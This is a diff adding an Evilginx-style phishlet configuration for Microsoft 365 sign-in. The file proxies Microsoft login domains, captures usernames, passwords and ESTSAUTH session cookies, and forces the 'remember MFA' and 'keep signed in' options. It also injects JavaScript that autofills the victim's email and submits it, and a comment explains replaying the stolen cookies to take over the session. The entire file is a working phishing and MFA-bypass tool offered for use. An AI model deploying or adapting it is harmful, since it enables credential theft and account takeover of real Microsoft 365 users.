@@ -1,0 +1,82 @@
+name: 'o365'
+author: '@an0nud4y'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie']      
+
+
+# INJECT COOKIES
+# --------------
+# 
+# Browse the url https://login.microsoftonline.com
+# inject the capture cookies 
+# Refresh the browser
+
+
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'     
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/' 
+force_post:
+  - path: '/kmsi'
+    search: 
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search: 
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post' 
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/","/","/*"]
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        if (/#/.test(window.location.href)){
+        var res = query.split("#");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+          if (emailId != null) {
+          var m = data2.replace(/[=]/gi, '');
+          emailId.focus();
+          emailId.value = m;
+          nextButton.focus();
+          nextButton.click();
+          console.log("YES!");
+          return;
+        }
+        }
+        setTimeout(function(){lp();}, 1500);
+      }
+      setTimeout(function(){lp();}, 1500);    
